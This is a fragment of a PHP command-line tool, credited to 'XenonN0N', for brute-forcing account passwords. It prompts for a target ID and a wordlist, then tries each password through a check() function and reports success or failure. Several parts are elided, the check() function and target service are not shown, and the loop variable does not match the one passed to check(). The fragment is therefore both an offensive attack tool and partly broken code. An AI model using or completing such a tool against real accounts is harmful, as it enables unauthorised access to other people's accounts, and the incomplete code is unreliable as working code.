...
".$cyan."Author: XenonN0N\n\n".$nc;
$file = $_SERVER[argv[1]];
echo "$green Enter ID Target:$yellow ";
$user = trim(fgets(STDIN));
echo "sulat moto passwordss.txt";
echo "$green enter word list:$yellow ";
...
if(!empty($user) && !empty($wordlist)) {
	...
	foreach($passlist as $password) {
		...
		if(check(urlencode($user), urlencode($pass))) {
			print $pass." => ".$green."SUCCESS\n".$nc;
			print $green." Password found ".$pass;
			break;
		} else {
			print $pass." => ".$red."FAILED\n".$nc;
		}
	}
} else {
	print $banner;
